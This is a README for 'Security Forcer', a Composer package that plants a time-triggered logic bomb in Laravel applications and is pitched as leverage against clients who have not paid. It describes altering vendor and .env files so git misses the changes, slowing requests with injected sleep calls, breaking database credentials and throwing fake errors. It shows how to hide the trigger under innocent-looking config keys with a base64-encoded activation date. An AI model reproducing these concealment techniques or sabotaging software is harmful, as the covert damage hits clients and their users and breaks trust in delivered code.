# Security Forcer
A composer package to force laravel developers for composer security. 
This package should not be included in production or for finished applications.

### Use of this package in practice
* You can use this to test your anti-malware, anti-virus packages/scripts.
* You can use this to stop your working code in case if your client steals your code with an unpaid portion of your earnings.
* You should be able to set a timer which would cause troubled times after the given date for the project.
* If you are to use this project for a shady client to secure your unpaid earnings please remember to remove it from the composer dependencies once/if you ever get your payment.

This package would only cause trouble / broke a working site / give strange errors and cause a buggy application. It will never steal any information or damage database entries etc. It is intended to cause soft but much effective bugs.

You won't be able to cause any damage at all if conditions are not met. For example security-forcer will not target any project but a project you specifically told to target and (optionally) only after given date.

Please don't use this package for an unlawful action. I don't have any responsibility for your use of this package.

You are welcome to fork it and change code for your needs.

### What It Does:
It modifies laravel vendor files and the apps' env files. This way it doesn't get caught in git. Here is the list of package actions and what they do:

* NightDistributer: puts 'sleep(1)' function inside application run cycles such as Illuminate\Pipeline\Pipeline, Illuminate\Routing\Router etc. and inside all functions of Illuminate\Database\Eloquent\Collection. That's about minimum 20+ seconds of response time if you are not using a lot of infected functions. Here is the full list:
    - Pipeline @ then,thenReturn,a (repeated) closure
    - Router @ dispatch,runRoute,dispatchToRoute
    - Route @ run
    - Eloquent\Collection @ *
    - TransformsRequest @ handle
    - ValidatePostSize @ handle
    - Foundation\Http\Kernel @ handle
    - AddQueuedCookiesToResponse @ handle
    - StartSession @ handle
* SillyConnection: messes with .env file changing values of APP_DEBUG, DB_HOST (to 127.0.0.0), DB_PASSWORD, DB_USERNAME, DB_CONNECTION.
* SpeedyDebugging: forces application to run with app.debug=false to prevent detailed errors
* RandomLimit: with a ``` time() % 11 < 4 ``` chance, application will throw "509 Whoops, looks like something went wrong." fake error.
* SyntaxHandler: with a ``` time() % 11 > 8 ``` chance, application will throw ```undefined variable $items``` fake error. It will show the real ending line number of controller@action.


### Usage
**In its easiest use you define a config value.**

For example in your config/hashing.php file, create an index with argon2id and set 'seed'. 'seed' should return a boolean value to tell the package whether it should run or not. Package will look for the value of ``` config('hashing.argon2id.seed') ``` to determine.

You can see an example below with the 'seed' value example.
```php
    'argon2id' => [
        'seed' => (time() > (new \DateTime(base64_decode('MjAyMS0wNi0wMQ==')))->format('U')), // will activate after a certain date
    ]
```

It is possible that you may not want this condition based on one index alone. So there are 4 config values that you can play with: 'hashing.argon2id.seed' or 'session.redis.secure' or 'logging.syslog.daily' and 'app.sfa'.

**This is how the package will decide:**
```php
config('app.sfa', true) && (
    config('hashing.argon2id.seed', null) || config('session.redis.secure', null) || config('logging.syslog.daily', null)
) // package will run if this returns true
```

Then you can just visit your site and it will run its' actions. You can also set APP_ENV=stesting and run ``` php artisan sf:start ``` in shell.

### How to get rid of this:
- Remove this package from your composer.json
- Delete your vendor directory
- composer install